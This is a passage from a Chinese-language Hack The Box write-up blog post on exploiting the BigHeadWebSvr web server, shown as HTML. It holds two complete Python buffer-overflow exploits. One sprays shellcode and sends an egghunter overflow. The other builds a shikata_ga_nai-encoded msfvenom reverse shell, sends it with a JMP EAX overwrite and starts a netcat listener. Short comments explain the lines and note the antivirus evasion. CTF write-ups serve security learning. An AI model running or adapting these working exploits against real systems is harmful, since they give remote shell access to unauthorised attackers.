shellcode</span><br><span class="line">post = <span class="string">&#x27;POST / HTTP/1.1\r\nHost: dev.bighead.htb\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &#123;&#125;\r\n\r\n&#x27;</span>.format(len(spray))</span><br><span class="line">spray_payload = post + spray</span><br><span class="line"></span><br><span class="line"><span class="built_in">head</span> = <span class="string">&quot;HEAD /&quot;</span></span><br><span class="line">junk = <span class="string">&quot;1&quot;</span> * (78-len(<span class="built_in">head</span>))</span><br><span class="line">jmp_esp = <span class="string">&quot;f0125062&quot;</span> <span class="comment">#p32(0x625012f0)</span></span><br><span class="line">host = <span class="string">&quot; HTTP/1.1\r\nHost: dev.bighead.htb\r\n\r\n&quot;</span></span><br><span class="line">exec_payload = <span class="built_in">head</span> + junk + jmp_esp + egghunter + host</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending payload 16 times&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(16):</span><br><span class="line">    p = remote(target, port)</span><br><span class="line">    <span class="comment">#print(spray_payload)</span></span><br><span class="line">    p.sendline(spray_payload)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    <span class="built_in">sleep</span>(0.1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Payload sent.\n[*] Sleeping 1 second.&quot;</span>)</span><br><span class="line"><span class="built_in">sleep</span>(1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Sending overflow + egghunter.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Expect callback in 0-3 minutes to %s:%s.&quot;</span> % (cb_ip, cb_port))</span><br><span class="line">p = remote(target, port)</span><br><span class="line">p.sendline(exec_payload)</span><br><span class="line"><span class="built_in">sleep</span>(1)</span><br><span class="line">p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>逐行代码解释:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第15-48行是关于生成shellcode和清理shellcode的</span><br><span class="line">第50-73行设置将发送的web请求</span><br><span class="line">第65-72行发送带有shell的POST请求16次</span><br><span class="line">第77-83行发送带egg hunter payload的<span class="built_in">head</span>请求</span><br></pre></td></tr></table></figure>
+
+<h3 id="Final-Exploit-2-回弹shell时间较长"><a href="#Final-Exploit-2-回弹shell时间较长" class="headerlink" title="Final Exploit 2 (回弹shell时间较长):"></a>Final Exploit 2 (回弹shell时间较长):</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line">import sys, subprocess, requests</span><br><span class="line">from requests import Request, Session</span><br><span class="line"></span><br><span class="line">banner = (</span><br><span class="line">          <span class="string">&quot;[+] Useage: %s &lt;rhost&gt; &lt;rport&gt; &lt;lhost&gt; &lt;lport&gt;&quot;</span>%sys.argv[0]</span><br><span class="line">         )</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    try:</span><br><span class="line">      rhost = sys.argv[1]</span><br><span class="line">      rport = sys.argv[2]</span><br><span class="line">      lhost = sys.argv[3]</span><br><span class="line">      lport = sys.argv[4]</span><br><span class="line">    except IndexError:</span><br><span class="line">      <span class="built_in">print</span>(banner)</span><br><span class="line">      sys.exit(-1)</span><br><span class="line"></span><br><span class="line">urlpath = (<span class="string">&quot;http://&quot;</span> + rhost + <span class="string">&quot;:&quot;</span> + str(rport) + <span class="string">&quot;/&quot;</span>)</span><br><span class="line">hdrs    = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;lUc1f3r11&#x27;</span>&#125;</span><br><span class="line">proxy   = &#123;<span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">lstner  = (<span class="string">&quot;nc -s &quot;</span> + lhost + <span class="string">&quot; -nvlp &quot;</span> + str(lport))</span><br><span class="line"></span><br><span class="line">mksh  = (<span class="comment"># Auto Generate Reverse Shell Payload Using msfvenom</span></span><br><span class="line">         <span class="string">&quot;msfvenom -p windows/shell_reverse_tcp&quot;</span> +</span><br><span class="line">         <span class="string">&quot; -e x86/shikata_ga_nai&quot;</span> +</span><br><span class="line">         <span class="string">&quot; EXITFUNC=thread&quot;</span> +</span><br><span class="line">         <span class="string">&quot; -v RevShell&quot;</span> +</span><br><span class="line">         <span class="string">&quot; LHOST=&quot;</span> + lhost +</span><br><span class="line">         <span class="string">&quot; LPORT=&quot;</span> + lport +</span><br><span class="line">         <span class="string">&quot; -f python&quot;</span> +</span><br><span class="line">         <span class="string">&quot; -a x86&quot;</span> +</span><br><span class="line">         <span class="string">&quot; -o RevPld.py&quot;</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Attempting To Generate Reverse Shell Payload ...&quot;</span>)</span><br><span class="line">    vnm = subprocess.Popen(mksh.split(), stdout=subprocess.PIPE)</span><br><span class="line">    vnm.wait()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Reverse Shell Payload Generated Successfully...&quot;</span>)</span><br><span class="line">except:    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[!] ERROR: Couldn&#x27;t Generate Payload&quot;</span>)</span><br><span class="line">    sys.exit(-1)</span><br><span class="line"></span><br><span class="line">from RevPld import RevShell</span><br><span class="line"></span><br><span class="line">shl  = (<span class="comment"># Prepends a string of 3mg33mg3</span></span><br><span class="line">        (<span class="string">&quot;3mg3&quot;</span> * 2) + </span><br><span class="line">        <span class="comment"># Insert msfvenom revshell payload </span></span><br><span class="line">        RevShell       </span><br><span class="line">       ) </span><br><span class="line"></span><br><span class="line">egh  = (<span class="comment"># EggHunter Shellcode</span></span><br><span class="line">        <span class="string">&quot;6681CAFF0F42526A&quot;</span>  <span class="comment"># 32 byte EggHunter, with egg of &#x27;3mg3&#x27;</span></span><br><span class="line">        <span class="string">&quot;0258CD2E3C055A74&quot;</span>  <span class="comment"># This will scan through mem address space </span></span><br><span class="line">        <span class="string">&quot;EFB8336D67338BFA&quot;</span>  <span class="comment"># and try to match the string &quot;3mg33mg3&quot;, </span></span><br><span class="line">        <span class="string">&quot;AF75EAAF75E7FFE7&quot;</span>  <span class="comment"># then execute the shellcode that follows it.</span></span><br><span class="line">       )</span><br><span class="line"></span><br><span class="line">buf  = (<span class="comment"># Place the EggHunter at the start of the buffer.</span></span><br><span class="line">        egh +</span><br><span class="line">        <span class="comment"># EIP Overwrite Buffer</span></span><br><span class="line">        (<span class="string">&quot;A&quot;</span> * ((<span class="number">72</span>) - len(egh))) +  </span><br><span class="line">        <span class="comment"># 64552F19 JMP EAX </span></span><br><span class="line">        <span class="comment"># From Module Name=C:\MinGW\bin\libmingwex-0.dll</span></span><br><span class="line">        <span class="string">&quot;192F5564&quot;</span> </span><br><span class="line">       )        </span><br><span class="line"></span><br><span class="line">sploit = (urlpath + buf)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Sending evil HTTP request to BigHeadWebSvr 1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">try: <span class="comment"># Prepare POST content body so it won&#x27;t URL Encode the shellcode data.</span></span><br><span class="line">  s = Session()</span><br><span class="line">  payload=&#123;<span class="string">&#x27;5h377&#x27;</span>:shl&#125;</span><br><span class="line">  r = Request(<span class="string">&#x27;POST&#x27;</span>, urlpath, data=payload, headers=hdrs)</span><br><span class="line">  prepped = r.prepare()</span><br><span class="line">  prepped.body = shl</span><br><span class="line">  del prepped.headers[<span class="string">&#x27;Content-Type&#x27;</span>]</span><br><span class="line">  <span class="comment"># Send The Egg RevShell Payload as a POST Request data  </span></span><br><span class="line">  resp = s.send(prepped, proxies=proxy, <span class="built_in">timeout</span>=0.01)</span><br><span class="line">  <span class="built_in">print</span>(resp.status_code)</span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+] Shell Payload Sent...&quot;</span>)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    <span class="comment"># Send the HEAD METHOD BOF Exploit</span></span><br><span class="line">    r = requests.head(sploit, headers=hdrs, <span class="built_in">timeout</span>=0.01, proxies=proxy)</span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+] Exploit Sent!&quot;</span>)</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    <span class="comment"># Start a netcat listener and wait for the incoming connection</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Listening for reverse shell&quot;</span>)</span><br><span class="line">    ncl = subprocess.Popen(lstner, shell=True)</span><br><span class="line">    ncl.poll()</span><br><span class="line">    ncl.wait()</span><br><span class="line">except:    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\r[!] Shell Terminated!&quot;</span>)</span><br><span class="line">    <span class="built_in">exit</span>(0)</span><br></pre></td></tr></table></figure>
+
+<p>此exploit生成的shellcode使用了msf的 x86&#x2F;shikata_ga_nai 编码模块有一定的免杀效果。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/12/30/hack-the-box-bigheadwebsvr-2/" title="Hack-The-Box[BigheadWebSvr逆向-part-2]">https://fdlucifer.github.io/2020/12/30/hack-the-box-bigheadwebsvr-2/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/12/26/hack-the-box-bigheadwebsvr/" rel="prev" title="Hack-The-Box[BigheadWebSvr逆向-part-1]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box[BigheadWebSvr逆向-part-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/01/05/noreturn/" rel="next" title="Hack-The-Box-pwn-challenge[no-return]">
+                  Hack-The-Box-pwn-challenge[no-return] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
